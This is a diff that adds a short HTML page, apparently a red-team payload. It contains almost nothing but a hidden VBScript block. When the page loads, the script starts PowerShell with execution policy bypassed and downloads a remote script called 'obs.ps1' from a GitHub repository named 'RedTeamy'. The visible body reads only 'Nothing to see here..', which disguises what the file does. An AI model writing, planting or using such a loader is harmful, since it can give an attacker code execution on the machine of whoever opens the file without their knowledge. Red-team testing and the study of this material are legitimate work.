@@ -1,0 +1,14 @@
+<html>
+<head>
+<script language="VBScript"> 
+    Sub RunProgram
+        Set objShell = CreateObject("Wscript.Shell")
+        objShell.Run "powershell.exe -exec bypass -C ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jakesadzik/RedTeamy/main/obs.ps1'))"
+    End Sub
+RunProgram()
+</script>
+</head> 
+<body>
+    Nothing to see here..
+</body>
+</html>
